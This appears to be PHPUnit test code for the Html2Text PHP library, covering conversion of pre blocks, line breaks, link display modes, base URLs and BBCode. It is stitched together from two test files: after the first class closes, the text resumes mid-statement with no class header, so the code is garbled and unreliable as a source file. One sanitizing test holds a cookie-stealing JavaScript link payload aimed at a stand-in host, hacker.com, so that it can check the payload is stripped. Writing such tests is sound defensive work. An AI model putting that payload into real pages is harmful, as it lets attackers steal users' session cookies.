<?php

namespace Html2Text;

class PreTest extends \PHPUnit_Framework_TestCase
{
    public function preDataProvider()
    {
        return array(
            'Basic pre' => array(
                'html' => <<<EOT
<p>Before</p>
<pre>

Foo bar baz


HTML symbols &amp;

</pre>
<p>After</p>
EOT
                ,
                'expected' => <<<EOT
Before

Foo bar baz

HTML symbols &

After

EOT
                ,
            ),
            'br in pre' => array(
                'html' => <<<EOT
<pre>
some<br />  indented<br />  text<br />    on<br />    several<br />  lines<br />
</pre>
EOT
                ,
                'expected' => <<<EOT
some
  indented
  text
    on
    several
  lines


EOT
                ,
            ),
        );
    }

    /**
     * @dataProvider preDataProvider
     */
    public function testPre($html, $expected)
    {
        $html2text = new Html2Text($html);
        $this->assertEquals($expected, $html2text->getText());
    }
}
utput, $expected);
    }

    public function testDoLinksNextline()
    {
        $expected =<<<EOT
Link text
[http://example.com]
EOT;

        $html2text = new Html2Text(self::TEST_HTML, array('do_links' => 'nextline'));
        $output = $html2text->getText();

        $this->assertEquals($expected, $output);
    }

    public function testDoLinksInHtml()
    {
        $html =<<<EOT
<p><a href="http://example.com" class="_html2text_link_none">Link text</a></p>
<p><a href="http://example.com" class="_html2text_link_inline">Link text</a></p>
<p><a href="http://example.com" class="_html2text_link_nextline">Link text</a></p>
EOT;

        $expected =<<<EOT
Link text

Link text [http://example.com]

Link text
[http://example.com]

EOT;

        $html2text = new Html2Text($html);
        $output = $html2text->getText();

        $this->assertEquals($expected, $output);
    }

    public function testBaseUrl()
    {
        $html = '<a href="/relative">Link text</a>';
        $expected = 'Link text [http://example.com/relative]';

        $html2text = new Html2Text($html, array('do_links' => 'inline'));
        $html2text->setBaseUrl('http://example.com');

        $this->assertEquals($expected, $html2text->getText());
    }

    public function testBaseUrlWithPlaceholder()
    {
        $html = '<a href="/relative">Link text</a>';
        $expected = 'Link text [%baseurl%/relative]';

        $html2text = new Html2Text($html, array('do_links' => 'inline'));
        $html2text->setBaseUrl('%baseurl%');

        $this->assertEquals($expected, $html2text->getText());
    }

    public function testBoldLinks()
    {
        $html = '<b><a href="http://example.com">Link text</a></b>';
        $expected = 'LINK TEXT [http://example.com]';

        $html2text = new Html2Text($html, array('do_links' => 'inline'));

        $this->assertEquals($expected, $html2text->getText());
    }

    public function testInvertedBoldLinks()
    {
        $html = '<a href="http://example.com"><b>Link text</b></a>';
        $expected = 'LINK TEXT [http://example.com]';

        $html2text = new Html2Text($html, array('do_links' => 'inline'));

        $this->assertEquals($expected, $html2text->getText());
    }

    public function testJavascriptSanitizing()
    {
        $html = '<a href="javascript:window.open(\'http://hacker.com?cookie=\'+document.cookie)">Link text</a>';
        $expected = 'Link text';

        $html2text = new Html2Text($html, array('do_links' => 'inline'));

        $this->assertEquals($expected, $html2text->getText());
    }

    public function testDoLinksBBCode()
    {
        $html = '<a href="http://example.com"><b>Link text</b></a>';
        $expected = '[url=http://example.com]LINK TEXT[/url]';

        $html2text = new Html2Text($html, array('do_links' => 'bbcode'));

        $this->assertEquals($expected, $html2text->getText());
    }

    public function testDoLinksWhenTargetInText()
    {
        $html = '<a href="http://example.com">http://example.com</a>';
        $expected = 'http://example.com';

        $html2text = new Html2Text($html, array('do_links' => 'inline'));

        $this->assertEquals($expected, $html2text->getText());

        $html2text = new Html2Text($html, array('do_links' => 'nextline'));

        $this->assertEquals($expected, $html2text->getText());
    }
}
